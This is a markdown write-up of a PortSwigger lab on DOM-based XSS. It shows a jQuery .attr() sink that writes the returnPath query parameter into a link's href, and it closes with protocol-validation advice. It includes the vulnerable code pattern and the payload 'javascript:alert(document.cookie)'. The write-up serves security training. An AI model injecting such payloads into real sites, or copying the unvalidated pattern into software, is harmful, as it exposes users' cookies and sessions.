# Lab06 - DOM XSS in jQuery Anchor href Attribute Sink Using location.search

## Objective

Exploit a DOM-Based XSS vulnerability where attacker-controlled input from:

```javascript
location.search
```

is written into an anchor element's:

```html
href
```

attribute using jQuery.

The goal is to execute:

```javascript
alert(document.cookie)
```

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | DOM-Based XSS |
| Difficulty | Apprentice |
| Source | location.search |
| Sink | jQuery .attr() |
| Context | href Attribute |
| Platform | PortSwigger |

---

# Vulnerability Overview

The application reads:

```javascript
returnPath
```

from:

```javascript
location.search
```

and inserts it into:

```html
<a href="">
```

using:

```javascript
.attr()
```

without validation.

---

# Vulnerable Code Pattern

```javascript
$('#backLink').attr(
'href',
(new URLSearchParams(
window.location.search
)).get('returnPath')
);
```

---

# Source → Sink Flow

```text
location.search
        ↓
returnPath
        ↓
.attr("href")
        ↓
Anchor href
        ↓
User Click
        ↓
JavaScript Execution
```

---

# Analysis

## Step 1

Navigate to:

```text
Submit Feedback
```

page.

---

## Step 2

Add parameter:

```text
returnPath=/carry123
```

---

URL:

```text
?returnPath=/carry123
```

---

## Step 3

Inspect page.

---

Observation:

```html
<a href="/carry123">
```

---

## Step 4

Determine Context

Input appears inside:

```text
Anchor href Attribute
```

---

## Step 5

Look For Dangerous Protocols

Test:

```javascript
javascript:alert(document.cookie)
```

---

# Full Payload(s) Used

## Probe Value

```text
/carry123
```

---

## Final Payload

```javascript
javascript:alert(document.cookie)
```

---

# Why The Payload Works

Original:

```html
<a href="/home">
Back
</a>
```

---

Injected:

```html
<a href=
"javascript:alert(document.cookie)">
Back
</a>
```

---

Execution Flow

```text
User Clicks Link
        ↓
Browser Evaluates javascript:
        ↓
alert(document.cookie)
        ↓
Execution
```

---

# Personal Analysis & Testing Process

## Initial Goal

Determine where:

```text
returnPath
```

appears.

---

## Probe Test

Used:

```text
/carry123
```

---

Observed:

```html
<a href="/carry123">
```

---

## Key Observation

Input controls:

```html
href
```

directly.

---

## Exploitation Strategy

Instead of:

```text
Normal URL
```

supply:

```text
JavaScript URL
```

---

Chosen Payload:

```javascript
javascript:alert(document.cookie)
```

---

## Result

Clicked:

```text
Back
```

link.

---

Browser executed:

```javascript
alert(document.cookie)
```

Lab solved.

---

# Mitigation

Validate allowed protocols.

Allow:

```text
https:
http:
```

---

Reject:

```text
javascript:
data:
vbscript:
```

---

# Related Theory

- 17-dom-xss-in-jquery.md
- 15-sources-and-sinks.md

---

# Key Learnings

- jQuery .attr() can become a dangerous sink.
- href attributes should never trust user input.
- JavaScript URLs remain a common DOM XSS technique.
- Always test protocol injection when controlling URLs.